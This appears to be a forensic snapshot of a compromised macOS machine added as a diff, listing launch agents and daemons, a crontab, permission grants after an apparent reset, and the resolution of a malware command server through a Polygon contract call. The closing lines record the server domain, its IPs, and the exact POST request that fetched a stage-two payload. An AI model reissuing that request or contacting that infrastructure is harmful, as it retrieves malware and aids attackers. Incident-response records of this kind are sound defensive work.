@@ -1,0 +1,168 @@
+# Live-state snapshot taken 2026-09-11 (post-quarantine)
+
+## launchctl list (non-Apple)
+PID	Status	Label
+770	0	com.macpaw.CleanMyMac4.HealthMonitor
+980	0	application.com.ameba.SwiftBar.213245073.213245086
+784	0	com.macpaw.CleanMyMac4.Menu
+-	0	com.claude-status-touch-bar.mtmr
+-	1	homebrew.mxcl.docker-machine
+841	0	application.com.cloudflare.1dot1dot1dot1.macos.231740981.231740986
+8990	0	application.com.anthropic.claudefordesktop.238900883.238900889
+852	0	application.com.sumbitlabs.openports.56728530.56728550
+840	0	application.com.postgresapp.Postgres2MenuHelper.4815418.26578125
+2712	0	com.openssh.ssh-agent
+857	0	application.com.heynote.app.103244575.103244581
+775	0	homebrew.mxcl.tor
+-	0	com.anthropic.claudefordesktop.ShipIt
+859	0	application.com.kyome.RunCat.167517021.167517030
+-	1	homebrew.mxcl.postgresql@15
+-	0	com.claude-status-touch-bar.ubersicht
+-	0	com.postgresapp.Postgres2LoginHelper
+959	0	application.com.spotify.client.233754815.233755706
+846	0	application.pro.betterdisplay.BetterDisplay.153548572.153548869
+-	0	com.spotify.client.startuphelper
+1288	0	application.tracesOf.Uebersicht.213263999.213264010
+838	0	application.com.googlecode.iterm2.230202804.230202824
+-	0	com.claude-status-touch-bar.swiftbar
+-	0	com.oracle.java.Java-Updater
+821	0	application.Toxblh.MTMR.213234347.213234597
+2338	0	application.com.google.Chrome.71489.238615527
+-	0	net.tunnelblick.launcher
+817	0	application.com.knollsoft.Rectangle.2191301.26578545
+-	0	com.macpaw.CleanMyMac4.Updater
+780	0	homebrew.mxcl.redis
+-	0	com.korrio.security-watchdog
+853	0	application.net.tunnelblick.tunnelblick.231751735.231751741
+790	0	homebrew.mxcl.colima
+793	0	homebrew.mxcl.mailhog
+
+## ~/Library/LaunchAgents
+total 96
+drwx------@  14 korrio  staff   448 19 Aug 14:42 .
+drwx------@ 103 korrio  staff  3296 26 Jul 12:55 ..
+-rw-r--r--@   1 korrio  staff   424 13 Jul 14:59 com.claude-status-touch-bar.mtmr.plist
+-rw-r--r--@   1 korrio  staff   432 13 Jul 14:59 com.claude-status-touch-bar.swiftbar.plist
+-rw-r--r--@   1 korrio  staff   435 13 Jul 14:59 com.claude-status-touch-bar.ubersicht.plist
+-rw-r--r--@   1 korrio  staff   873 27 May  2025 com.google.GoogleUpdater.wake.plist
+-rw-r--r--@   1 korrio  staff   726 19 Aug 14:42 com.korrio.security-watchdog.plist
+-rw-r--r--@   1 korrio  staff   561 24 May  2025 com.macpaw.CleanMyMac4.Updater.plist
+-rw-r--r--@   1 korrio  staff  1073 22 Apr 16:08 homebrew.mxcl.colima.plist
+-rw-r--r--@   1 korrio  staff   865 14 Nov  2025 homebrew.mxcl.docker-machine.plist
+-rw-r--r--@   1 korrio  staff   974  8 Aug  2025 homebrew.mxcl.mailhog.plist
+-rw-r--r--@   1 korrio  staff  1020 10 Oct  2025 homebrew.mxcl.postgresql@15.plist
+-rw-r--r--@   1 korrio  staff   880  8 Aug  2025 homebrew.mxcl.redis.plist
+-rw-r--r--@   1 korrio  staff   811 15 Aug  2025 homebrew.mxcl.tor.plist
+
+## /Library/LaunchDaemons
+total 88
+drwxr-xr-x  13 root  wheel   416 11 Sep 09:35 .
+drwxr-xr-x  70 root  wheel  2240 24 Aug 11:10 ..
+-rw-r--r--   1 root  wheel   614 20 Aug 13:47 com.cloudflare.1dot1dot1dot1.macos.warp.daemon.plist
+-rw-r--r--   1 root  wheel   492 11 Sep 09:35 com.cloudflare.warp.updater.plist
+-rw-r--r--@  1 root  wheel   587  4 Aug  2025 com.docker.socket.plist
+-rw-r--r--@  1 root  wheel  1046 23 Nov  2025 com.github.containers.podman.helper-korrio.plist
+-rw-r--r--   1 root  wheel   572 24 May  2025 com.macpaw.CleanMyMac4.Agent.plist
+-rw-r--r--   1 root  wheel   428 18 Oct  2025 com.microsoft.autoupdate.helper.plist
+-rw-r--r--   1 root  wheel   408 20 Sep  2024 com.sophos.connect.scvpn.plist
+-rw-r--r--   1 root  wheel   485 20 Sep  2024 com.sophos.connect.strongswan.plist
+-rw-r--r--   1 root  wheel   686 19 Mar  2025 dev.orbstack.OrbStack.privhelper.plist
+-rw-r--r--@  1 root  wheel   934 31 Mar 07:53 net.tunnelblick.tunnelblick.tunnelblickd.plist
+-rw-r--r--   1 root  wheel   622 20 Mar 08:44 us.zoom.ZoomDaemon.plist
+
+## /Library/LaunchAgents
+total 16
+drwxr-xr-x   5 root  wheel   160 26 Jul 12:52 .
+drwxr-xr-x  70 root  wheel  2240 24 Aug 11:10 ..
+-rw-r--r--   1 root  wheel   516  1 Oct  2025 com.adobe.ccxprocess.plist
+-rw-r--r--   1 root  wheel   405 18 Oct  2025 com.microsoft.update.agent.plist
+lrwxr-xr-x   1 root  wheel   104 12 Feb  2025 com.oracle.java.Java-Updater.plist -> /Library/Internet Plug-Ins/JavaAppletPlugin.plugin/Contents/Resources/com.oracle.java.Java-Updater.plist
+
+## crontab
+0 6 * * * docker restart odoo odoo-db
+
+
+## TCC grants modified 2026-08-10 (evidence of tccutil reset All at 08:41 then re-grants)
+2026-08-10 08:41:00|kTCCServiceLiverpool|com.apple.iCloudNotificationAgent
+2026-08-10 08:41:00|kTCCServiceLiverpool|com.apple.securityd
+2026-08-10 08:41:00|kTCCServiceUbiquity|com.apple.QuickTimePlayerX
+2026-08-10 08:41:00|kTCCServiceUbiquity|com.apple.Automator
+2026-08-10 08:41:00|kTCCServiceUbiquity|com.apple.MobileSMS
+2026-08-10 08:41:01|kTCCServiceUbiquity|com.apple.iWork.Numbers
+2026-08-10 08:41:01|kTCCServiceUbiquity|com.apple.ScriptEditor2
+2026-08-10 08:41:01|kTCCServiceUbiquity|com.apple.Preview
+2026-08-10 08:41:01|kTCCServiceUbiquity|com.apple.iBooksX
+2026-08-10 08:41:01|kTCCServiceUbiquity|com.apple.mail
+2026-08-10 08:41:01|kTCCServiceUbiquity|com.apple.shortcuts
+2026-08-10 08:41:01|kTCCServiceUbiquity|com.coderforart.One-Markdown
+2026-08-10 08:41:01|kTCCServiceUbiquity|com.apple.TextEdit
+2026-08-10 08:41:02|kTCCServiceLiverpool|com.apple.siriknowledged
+2026-08-10 08:41:02|kTCCServiceLiverpool|com.apple.shortcuts
+2026-08-10 08:41:03|kTCCServiceUbiquity|com.apple.weather.widget
+2026-08-10 08:41:03|kTCCServiceUbiquity|com.apple.weather
+2026-08-10 08:41:03|kTCCServiceLiverpool|com.apple.stocks
+2026-08-10 08:41:03|kTCCServiceLiverpool|com.apple.stocks.widget
+2026-08-10 08:41:05|kTCCServiceLiverpool|com.apple.syncdefaultsd
+2026-08-10 08:41:11|kTCCServiceLiverpool|com.apple.StatusKitAgent
+2026-08-10 08:41:12|kTCCServiceLiverpool|com.apple.security.cuttlefish
+2026-08-10 08:41:16|kTCCServiceLiverpool|com.apple.donotdisturbd
+2026-08-10 08:41:17|kTCCServiceLiverpool|com.apple.voicebankingd
+2026-08-10 08:41:18|kTCCServiceLiverpool|/System/Library/PrivateFrameworks/TextToSpeechVoiceBankingSupport.framework/Support/voicebankingd
+2026-08-10 08:41:19|kTCCServiceSystemPolicyDesktopFolder|com.googlecode.iterm2
+2026-08-10 08:41:20|kTCCServiceSystemPolicyDesktopFolder|/bin/bash
+2026-08-10 08:41:22|kTCCServiceAppleEvents|/bin/bash
+2026-08-10 08:41:23|kTCCServiceAppleEvents|/bin/bash
+2026-08-10 08:41:26|kTCCServiceLiverpool|com.apple.triald
+2026-08-10 08:41:44|kTCCServiceLiverpool|com.apple.assistant.assistantd
+2026-08-10 08:41:44|kTCCServiceLiverpool|com.apple.suggestd
+2026-08-10 08:41:44|kTCCServiceLiverpool|com.apple.willowd
+2026-08-10 08:41:44|kTCCServiceLiverpool|com.apple.knowledge-agent
+2026-08-10 08:41:44|kTCCServiceLiverpool|com.apple.icloud.searchpartyuseragent
+2026-08-10 08:41:44|kTCCServiceLiverpool|com.apple.imagent
+2026-08-10 08:41:45|kTCCServiceLiverpool|com.apple.transparencyd
+2026-08-10 08:41:45|kTCCServiceLiverpool|com.apple.bluetoothuserd
+2026-08-10 08:41:45|kTCCServiceLiverpool|com.apple.ScreenTimeAgent
+2026-08-10 08:41:45|kTCCServiceLiverpool|com.apple.findmy.findmylocateagent
+2026-08-10 08:41:46|kTCCServiceLiverpool|com.apple.cloudpaird
+2026-08-10 08:41:46|kTCCServiceLiverpool|com.apple.Notes
+2026-08-10 08:41:46|kTCCServiceLiverpool|com.apple.UsageTrackingAgent
+2026-08-10 08:41:46|kTCCServiceLiverpool|com.apple.amsengagementd
+2026-08-10 08:41:50|kTCCServiceLiverpool|com.apple.cloudphotod
+2026-08-10 08:41:50|kTCCServiceLiverpool|com.apple.upload-request-proxy.com.apple.photos.cloud
+2026-08-10 08:41:55|kTCCServiceLiverpool|com.apple.routined
+2026-08-10 08:42:47|kTCCServiceLiverpool|com.apple.textinput.KeyboardServices
+2026-08-10 08:45:04|kTCCServiceUbiquity|com.apple.identityservicesd
+2026-08-10 08:45:05|kTCCServiceLiverpool|/System/Library/PrivateFrameworks/iCloudNotification.framework/iCloudNotificationAgent
+2026-08-10 08:45:11|kTCCServiceUbiquity|com.apple.wifi.WiFiAgent
+2026-08-10 08:45:12|kTCCServiceUbiquity|com.apple.finder
+2026-08-10 08:45:14|kTCCServiceLiverpool|com.apple.Passbook
+2026-08-10 08:45:14|kTCCServiceLiverpool|com.apple.identityservicesd
+2026-08-10 08:45:14|kTCCServiceLiverpool|com.apple.protectedcloudstorage.protectedcloudkeysyncing
+2026-08-10 08:45:14|kTCCServiceLiverpool|com.apple.sociallayerd
+2026-08-10 08:45:14|kTCCServiceLiverpool|com.apple.bird
+2026-08-10 08:45:15|kTCCServiceUbiquity|com.apple.Notes
+2026-08-10 08:45:17|kTCCServiceLiverpool|com.apple.Maps
+2026-08-10 08:45:28|kTCCServiceLiverpool|com.apple.iad-cloudkit
+2026-08-10 08:45:29|kTCCServiceUbiquity|com.apple.imagent
+2026-08-10 08:45:53|kTCCServiceUbiquity|com.apple.universalcontrol
+2026-08-10 08:46:00|kTCCServiceLiverpool|/System/Library/PrivateFrameworks/UsageTracking.framework/Versions/A/UsageTrackingAgent
+2026-08-10 08:46:25|kTCCServiceBluetoothAlways|com.macpaw.CleanMyMac4
+2026-08-10 08:46:27|kTCCServiceSystemPolicyDownloadsFolder|com.macpaw.CleanMyMac4
+2026-08-10 08:46:29|kTCCServiceFileProviderDomain|com.macpaw.CleanMyMac4
+2026-08-10 08:46:39|kTCCServiceLiverpool|com.apple.Safari
+2026-08-10 08:47:00|kTCCServiceLiverpool|com.apple.appleaccountd
+2026-08-10 09:11:56|kTCCServiceMicrophone|jp.naver.line.mac
+2026-08-10 09:16:57|kTCCServiceMicrophone|com.google.Chrome
+2026-08-10 09:17:01|kTCCServiceCamera|com.google.Chrome
+2026-08-10 09:41:25|kTCCServiceLiverpool|com.apple.avatarsd
+2026-08-10 14:25:43|kTCCServiceLiverpool|com.apple.callhistory.sync-helper
+2026-08-10 15:35:23|kTCCServiceLiverpool|com.apple.iWork.Numbers
+2026-08-10 18:08:48|kTCCServiceLiverpool|com.apple.biomesyncd
+
+## Polygon eth_call result (C2 resolution) 2026-09-11
+contract 0xA3a603F8a454a9c905b4c579Bb72628F7C15C2A0 selector 0x2686ecea -> jse8x92s.me
+172.67.204.237
+104.21.52.225
+
+## stage2 fetch
+POST https://jse8x92s.me -d 'txid=d50f29d4d180318d6c36afa9a59b0514&bmodule' -> HTTP 200, 32934 bytes, remote 104.21.52.225 (Cloudflare)
